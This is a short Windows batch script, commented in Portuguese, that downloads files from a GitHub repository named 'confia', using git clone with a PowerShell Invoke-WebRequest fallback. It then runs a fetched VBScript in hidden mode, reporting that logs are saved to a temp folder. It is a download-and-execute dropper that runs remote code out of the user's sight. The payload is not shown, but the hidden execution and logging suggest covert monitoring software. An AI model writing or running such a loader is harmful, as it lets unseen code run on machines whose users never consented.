@echo off
REM Script que baixa do GitHub e executa automaticamente
set "REPO_URL=https://github.com/testeconfia/confia.git"
set "TEMP_DIR=%TEMP%\confia_download"
set "INSTALL_DIR=%TEMP_DIR%\confia"

echo Baixando e executando confia...
echo.

REM Criar pasta temporária
if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%"
mkdir "%TEMP_DIR%"

REM Baixar do GitHub usando git clone
echo Baixando do GitHub...
git clone "%REPO_URL%" "%INSTALL_DIR%" 2>nul

REM Verificar se download foi bem-sucedido
if not exist "%INSTALL_DIR%\confia.bat" (
    echo Erro: Nao foi possivel baixar do GitHub
    echo Tentando metodo alternativo...
    
    REM Método alternativo usando PowerShell
    powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/testeconfia/confia/main/confia.bat' -OutFile '%INSTALL_DIR%\confia.bat'}"
    powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/testeconfia/confia/main/run_hidden.vbs' -OutFile '%INSTALL_DIR%\run_hidden.vbs'}"
)

REM Executar o script oculto
if exist "%INSTALL_DIR%\run_hidden.vbs" (
    echo Executando confia de forma oculta...
    cscript //nologo "%INSTALL_DIR%\run_hidden.vbs"
    echo.
    echo Confia executado com sucesso!
    echo Logs salvos em: %TEMP%\confia\
    echo.
    echo Para parar: Ctrl+Alt+Del -> Gerenciador de Tarefas
) else (
    echo Erro: Arquivos nao encontrados
)

echo.
echo Pressione qualquer tecla para sair...
pause >nul
